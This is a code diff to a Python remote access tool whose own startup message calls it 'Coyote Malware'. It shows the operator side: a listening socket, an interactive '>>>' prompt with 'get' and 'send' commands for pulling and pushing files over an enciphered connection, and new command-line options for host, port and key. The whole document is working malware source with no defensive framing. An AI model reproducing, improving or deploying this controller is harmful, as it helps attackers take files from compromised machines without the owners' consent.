@@ -8,13 +8,13 @@ from os import system
 from sys import argv
 
 class Coyote:
-    def __init__(self, port, key, defaulthearing=True, printing=True):
+    def __init__(self, ip ,port, key, defaulthearing=True, printing=True):
         if(printing):
             print("Starting Coyote Malware...");
         self.conn = 0;
         self.v = v(key);
         self.sock = socket(AF_INET, SOCK_STREAM);
-        self.sock.bind(('0.0.0.0', port));
+        self.sock.bind((ip, port));
         self.sock.listen(1);
         self.hearing = True;
         if(defaulthearing):
@@ -33,8 +33,10 @@ class Coyote:
         while cmd != "exit":
             cmd = input(">>>");
             if(cmd[:3] == "get"):
+                self.send(cmd);
                 self.getFile(cmd[4:]);
             elif(cmd[:4] == "send"):
+                self.send(cmd);
                 self.sendFile(cmd[5:]);
             elif cmd == "cls":
                 system("cls");
@@ -48,9 +50,9 @@ class Coyote:
             if(msj == 0):
                 continue;
             if(msj[:2] == "**"):
-                self.getFile(msj[:3]);
+                self.getFile(msj[3:]);
             else:
-                print(msj);
+                print("\n{}".format(msj));
                 print("\n>>>");
 
 
@@ -67,11 +69,11 @@ class Coyote:
         with open(file, "wb") as f:
             try:
                 self.conn.settimeout(10);
-                content = self.recv(decode=False, decrypt=True, b=10240);
+                content = self.recv(decode=False, decrypt=True, b=1024);
             except Exception as e:
                 print(e);
             else:
-                f.write(content);
+                f.write(str(content).encode());
             finally:
                 self.conn.settimeout(0.0);
 
@@ -100,7 +102,12 @@ class Coyote:
 
 
 def main():
-    c = Coyote(5000,"eajlkwbcpqynvhigdrzotusfmx");
+    oP = op("Usage: %prog [flags] [args]");
+    oP.add_option("-H" ,"--host",dest="ip" ,default="127.0.0.1",type="str",help="Set your host");
+    oP.add_option("-p","--port",dest="port",default=5000, type="int",help="Set your port");
+    oP.add_option("-k", "--key",dest="key", default="eajlkwbcpqynvhigdrzotusfmx", type="str", help="Set key");
+    (o, argv) = oP.parse_args();
+    c = Coyote(o.ip,o.port,o.key);
     c.shell();
 
 if __name__ == '__main__':
